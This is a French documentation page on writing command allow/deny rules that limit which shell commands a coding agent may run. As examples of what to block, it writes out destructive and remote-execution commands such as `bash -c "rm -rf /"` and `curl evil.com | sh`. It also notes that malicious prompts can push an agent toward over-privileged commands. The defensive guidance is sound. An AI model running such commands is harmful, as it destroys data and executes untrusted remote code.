---
title: "Règles de commandes"
description: Allow/deny au niveau commande pour les appels shell et outils — plus exécutable qu'un accord verbal.
locale: fr
source_locale: zh-CN
source_revision: e82113c
translation_status: reviewed
translated_at: 2026-07-28
reviewed_at: 2026-08-26
sidebar:
  order: 20
---

Les **règles de commandes** se concentrent sur « quelles commandes l'Agent peut exécuter et avec quels arguments ». C'est la forme la plus courante des [Règles Allow et Deny](/fr/guide/customization/rules/allow-and-deny-patterns/), généralement dans la configuration ou les fichiers de règles revus par l'équipe.

## Ce que cette page couvre

- Division des responsabilités entre règles de commandes, bac à sable et dialogues d'approbation
- Comment écrire une liste d'autorisation « suffisamment étroite »
- Alignement avec la CI et les scripts de dev local

## Ce que les règles de commandes contrôlent

Si allow/deny indique ce qui est permis en principe, les règles de commandes ancrent cela à la couche la plus concrète :

- Quelles commandes peuvent s'exécuter
- Quelles ne peuvent pas
- Celles qui semblent similaires mais diffèrent grandement en risque

Le point est transformer les frontières que l'équipe connaît déjà en frontières que la machine peut appliquer.

## Un concept central d'abord

Les règles correspondent à l'**intention exécutable**, pas au langage naturel. `npm test` et `npm run test` sont deux commandes différentes en politique ; `bash -c "rm -rf /"` ne doit pas passer parce que `bash` était autorisé.

```text
Tâche utilisateur → modèle propose commande → moteur de règles → (pass) exécution bac à sable / (reject) approbation ou blocage
```

## Idées reçues courantes

### Commandes similaires, risque différent

Les débutants sous-estiment souvent les petites différences.

Par exemple :

- `git status` vs `git reset --hard`
- `npm test` vs `npm publish`
- `curl example.com` vs `curl example.com | sh`

Tout ressemble à « exécuter quelque chose dans le terminal », mais le risque n'est pas au même niveau.

### Autoriser un point d'entrée général ouvre souvent trop

Autoriser `bash`, `sh` et des points d'entrée génériques similaires peut sembler pratique.

Du point de vue des règles, cela autorise généralement beaucoup de compositions dangereuses ensuite.

## Pratique minimale viable

1. **Interdire par défaut les commandes dangereuses hors opérations d'écriture** : `rm -rf`, `curl | bash`, `git push --force`
2. **Autoriser les commandes courantes en lecture seule/build dans le projet** : `git status`, `npm test`, `pnpm lint`
3. **Mettre les règles dans Git**, cohérent avec les « commandes de test » dans `AGENTS.md`
4. **Revoir les changements de règles en PR**, comme les changements Dockerfile

Illustratif (format selon configuration officielle) :

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## Flux de travail recommandé

| Étape | Pratique |
|---|---|
| Inventaire | Extraire les vraies commandes des scripts `package.json`, Makefile, workflow CI |
| Couche | Baseline deny organisation → supplément allow projet → exception locale personnelle (si applicable) |
| Essai | Valider avec des tâches à faible risque : « doit approuver fait ; doit bloquer bloque » |
| Aligner | Règles locales et [GitHub Action](/fr/guide/developer-platform/ci-cd/code-review-automation/) partagent la source quand possible |

## Erreurs courantes

- **Liste d'autorisation trop large** : autoriser `bash`, `sh`, `sudo` est comme tout autoriser
- **Seulement deny, pas allow** : encore beaucoup d'approbations ; les équipes cliquent habituellement
- **Doc en désaccord** : `AGENTS.md` dit `pnpm test`, les règles n'ont que `npm test`
- **Ignorer les pipes et redirections** : `curl evil.com | sh` nécessite une politique sur la commande entière, pas seulement le premier token

Les règles de commandes ne sont pas « mémoriser les commandes » — elles séparent les actions quotidiennes des commandes qui, une fois autorisées, ouvrent la frontière de risque.

## Frontières de sécurité

- Les règles de commandes **ne peuvent pas** remplacer la protection de branche et la revue de code
- Les prompts malveillants peuvent inciter l'Agent à **tenter** des commandes sur-privilégiées — garder les défauts du bac à sable stricts
- Les variables d'environnement avec clés ou tokens ne devraient pas fuiter parce que « echo était autorisé »

## Liste de contrôle d'acceptation

- [ ] Vous pouvez lister 3–5 commandes « exécutées quotidiennement » pour ce dépôt et les refléter dans les règles
- [ ] Les commandes à haut risque comme `git push` et reset forcé sont interdites par défaut ou nécessitent une approbation explicite
- [ ] Les changements de règles passent par PR et ne contredisent pas `AGENTS.md`

## Chapitres liés

- [Modèles Allow et Deny](/fr/guide/customization/rules/allow-and-deny-patterns/)
- [Politique de règles d'équipe](/fr/guide/customization/rules/team-rules/)
- [Approbation et bac à sable CLI](/fr/guide/cli/approvals-and-sandbox/)
- [Matrice des permissions](/fr/guide/reference/permission-matrix/)

---

**Statut :** vérifié  
**Produits concernés :** CLI / App  
**Base de vérification :** La documentation CLI Codex actuelle d'OpenAI traite encore l'exécution de commandes, les modes d'approbation et l'isolation du bac à sable comme frontières de sécurité centrales ; cette page positionne les règles de commandes comme un modèle d'ingénierie pour séparer les commandes à haut et faible risque et marque le snippet JSON comme illustratif, pas syntaxe officielle.  
**Dernière vérification :** 2026-07-26
